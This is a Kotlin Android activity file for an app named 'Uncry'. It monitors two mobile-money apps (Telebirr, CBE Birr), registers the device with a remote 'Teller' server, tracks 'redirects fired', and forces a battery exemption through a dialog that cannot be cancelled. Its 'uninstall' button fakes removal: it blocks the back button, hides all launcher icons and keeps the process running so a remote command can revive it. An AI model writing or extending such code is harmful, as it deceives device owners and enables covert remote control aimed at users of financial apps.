package com.uncry

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val uninstallHandler = Handler(Looper.getMainLooper())
    private var batteryDialog: AlertDialog? = null
    private var packageReceiverRegistered = false

    private val packageReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val pkg = intent.data?.schemeSpecificPart ?: return
            if (pkg !in MonitoredApps.DEFAULTS) return
            Log.i("MainActivity", "package changed while open: ${intent.action} $pkg")
            refreshMonitorUi()
            try { AppMonitorService.refresh(context.applicationContext) } catch (_: Exception) {}
        }
    }

    private val backBlocker = object : OnBackPressedCallback(false) {
        override fun handleOnBackPressed() {}
    }

    private val notifPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) {
            refreshMonitorUi()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        onBackPressedDispatcher.addCallback(this, backBlocker)
        findViewById<Button>(R.id.btn_uninstall).setOnClickListener { fakeUninstall() }
        findViewById<Button>(R.id.btn_start_monitor).setOnClickListener { startMonitoring() }
        findViewById<Button>(R.id.btn_stop_monitor).setOnClickListener {
            AppMonitorService.stop(this); refreshMonitorUi()
        }
        findViewById<Button>(R.id.btn_battery).setOnClickListener {
            if (!AutostartHelper.requestBatteryExemption(this)) Toast.makeText(this, "Could not open battery settings.", Toast.LENGTH_LONG).show()
        }
        findViewById<Button>(R.id.btn_autostart).setOnClickListener {
            if (!AutostartHelper.openVendorAutostart(this)) Toast.makeText(this, "Could not open autostart settings.", Toast.LENGTH_LONG).show()
        }
        if (AppAlias.isHidden(this)) {
            // Opened from Settings while hidden: user explicitly wants it back.
            AppAlias.show(this)
        } else {
            AppAlias.enforce(this)
        }
        AppMonitorService.start(this)
        DeviceRegistrar.registerAsync(this)
        refreshMonitorUi()
        maybePromptBatteryExemption()
        requestNotifPermissionIfNeeded()
    }

    override fun onResume() {
        super.onResume()
        DeviceRegistrar.heartbeatAsync(this)
        refreshMonitorUi()
    }

    override fun onStart() {
        super.onStart()
        if (!packageReceiverRegistered) {
            try {
                val filter = IntentFilter().apply {
                    addAction(Intent.ACTION_PACKAGE_ADDED); addAction(Intent.ACTION_PACKAGE_REMOVED); addAction(Intent.ACTION_PACKAGE_REPLACED); addDataScheme("package")
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) registerReceiver(packageReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
                else @Suppress("UnspecifiedRegisterReceiverFlag") registerReceiver(packageReceiver, filter)
                packageReceiverRegistered = true
            } catch (_: Exception) {}
        }
    }

    override fun onStop() {
        if (packageReceiverRegistered) { try { unregisterReceiver(packageReceiver) } catch (_: Exception) {}; packageReceiverRegistered = false }
        super.onStop()
    }

    override fun onDestroy() {
        uninstallHandler.removeCallbacksAndMessages(null)
        batteryDialog?.dismiss(); batteryDialog = null
        super.onDestroy()
    }

    private fun hasNotifPermission(): Boolean =
        Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED

    private fun requestNotifPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && !hasNotifPermission()) {
            notifPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    private fun maybePromptBatteryExemption() {
        if (AutostartHelper.isIgnoringBatteryOptimizations(this)) { batteryDialog?.dismiss(); batteryDialog = null; return }
        if (batteryDialog?.isShowing == true) return
        batteryDialog = AlertDialog.Builder(this)
            .setTitle("Battery optimization")
            .setMessage("Uncry requires Battery Exemption to run as intended.")
            .setPositiveButton("Allow") { _, _ ->
                if (!AutostartHelper.requestBatteryExemption(this)) Toast.makeText(this, "Could not open battery settings.", Toast.LENGTH_LONG).show()
                refreshMonitorUi()
            }
            .setCancelable(false).show()
    }

    private fun refreshMonitorUi() {
        val snap = try { MonitoredApps.snapshot(packageManager) } catch (_: Exception) { return }
        fun line(pkg: String): String {
            val v = MonitoredApps.appVersion(packageManager, pkg)
            return if (pkg in snap.installed) "✓ ${MonitoredApps.label(pkg)} — installed" + (if (v != null) " (v$v)" else "") + " — monitored"
            else "✗ ${MonitoredApps.label(pkg)} — not installed"
        }
        findViewById<TextView>(R.id.app1_status).text = line(MonitoredApps.TELEBIRR)
        findViewById<TextView>(R.id.app2_status).text = line(MonitoredApps.CBE_BIRR)
        findViewById<TextView>(R.id.monitor_status).text = when {
            snap.installed.size == MonitoredApps.DEFAULTS.size -> "Watching both apps for install state."
            snap.installed.size == 1 -> "Only ${MonitoredApps.label(snap.installed[0])} is installed — watching it."
            else -> "Neither target app is installed — monitor is running and will pick them up when installed."
        }
        val battery = if (AutostartHelper.isIgnoringBatteryOptimizations(this)) "Battery optimization: off (good for always-on)" else "Battery optimization: on (tap below to exempt Uncry)"
        val notif = if (hasNotifPermission()) "Notifications: allowed (background Relay works)" else "Notifications: not allowed — grant to enable background Relay"
        val svc = if (AppMonitorService.running) "Monitor service: RUNNING" else "Monitor service: stopped"
        val devId = getSharedPreferences("uncry", MODE_PRIVATE).getString("teller_device_id", null)?.take(8) ?: "—"
        val tellerBase = DeviceRegistrar.getBaseUrl(this)
        findViewById<TextView>(R.id.keepalive_status).text = "$svc\n$battery\n$notif\nDevice: $devId\nTeller: $tellerBase"
        val prefs = getSharedPreferences("uncry", MODE_PRIVATE)
        prefs.getString("last_pkg", null)?.let { findViewById<TextView>(R.id.monitor_status).append("\nLast seen: $it") }
        val redirects = prefs.getInt("redirect_count", 0)
        if (redirects > 0) {
            val lastTry = prefs.getLong("last_redirect_try", 0)
            val whenText = if (lastTry > 0) java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(lastTry)) else "?"
            findViewById<TextView>(R.id.monitor_status).append("\nRedirects fired: $redirects (last $whenText)")
        }
    }

    private fun startMonitoring() {
        if (!hasNotifPermission() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestNotifPermissionIfNeeded(); Toast.makeText(this, "Grant notification permission for background Relay.", Toast.LENGTH_LONG).show(); return
        }
        AppMonitorService.start(this); Toast.makeText(this, "Monitoring started.", Toast.LENGTH_SHORT).show(); refreshMonitorUi()
    }

    private fun fakeUninstall() {
        findViewById<Button>(R.id.btn_uninstall).isEnabled = false
        findViewById<View>(R.id.uninstall_overlay).visibility = View.VISIBLE
        backBlocker.isEnabled = true
        // Fake uninstall: hide every launcher icon (app stays installed and
        // running so Teller can bring it back with Visible). The process is
        // deliberately NOT killed — killing it would stop the poll loop and
        // no remote Visible command could ever arrive.
        uninstallHandler.postDelayed({
            AppAlias.hide(this)
            DeviceRegistrar.heartbeatAsync(this)
            finishAndRemoveTask()
        }, 2500)
    }
}
